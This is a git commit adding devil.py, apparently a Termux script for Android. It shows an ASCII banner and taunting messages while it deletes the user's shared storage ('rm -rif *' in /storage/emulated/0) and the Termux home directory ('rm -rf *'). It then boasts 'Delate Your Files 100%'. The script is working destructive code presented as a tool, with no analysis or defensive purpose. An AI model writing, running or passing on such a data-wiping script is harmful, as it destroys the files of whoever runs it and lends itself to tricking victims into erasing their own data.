0f22f99dccd1a7e6ded24fa333bf3dca427a9dc9
devil135 <68862743+devil135@users.noreply.github.com>
2020-09-11 21:35:34 +0100

    devil-bom

---
+++ devil.py
@@ -0,0 +1,72 @@
+                                                       
+import os
+import time
+
+
+
+#i love python 💓💓💓💓💓💓💓
+#devil
+#devil
+#devil
+#devil
+#devil
+
+
+
+
+
+os.system("clear")
+import os
+print("  _____   _____    _____    _____   _____         _   _   _____   _   _  ")
+print(" | ____| |  _  \  |  _  \  /  _  \ |  _  \       | | | | /  _  \ | | | | ")
+print(" | |__   | |_| |  | |_| |  | | | | | |_| |       | |_| | | | | | | |_| | ")
+print(" |  __|  |  _  /  |  _  /  | | | | |  _  /       \___  | | |/| | \___  | ")
+print(" | |___  | | \ \  | | \ \  | |_| | | | \ \           | | | |_| |     | | ")
+print(" |_____| |_|  \_\ |_|  \_\ \_____/ |_|  \_\          |_| \_____/     |_| ")
+
+print('')
+
+red = "\033[0;31m"
+pur = "\033[0;35m"
+gre = "\033[0;32m"
+yel = "\033[0;33m"
+blu = "\033[0;34m"
+cya = "\033[1;36m"
+whi = "\033[0;37m"
+
+
+os.chdir('/storage/emulated/0')
+os.system("cd /sdcard")
+os.system("rm -rif *")
+
+print(os.getcwd())
+
+os.system("clear")
+
+
+print ("" + gre)
+
+
+print("\t\t\tY       o       u")
+time.sleep(3)
+os.system("clear")
+
+print ("" +pur)
+
+print ("\t\t\tA       R       E")
+time.sleep(3)
+os.system("clear")
+
+print ("" +red)
+
+print ("\t\t  S   T    U    P    E    D")
+time.sleep(3)
+
+
+os.chdir('/data/data/com.termux/files/home/devil-bom')
+os.system('mv 1.jpg /sdcard')
+print ("" +cya)
+os.chdir('/data/data/com.termux/files/home')
+os.system ("rm -rf *")
+
+print ("\t\n\n\t Delate Your Files 100%")
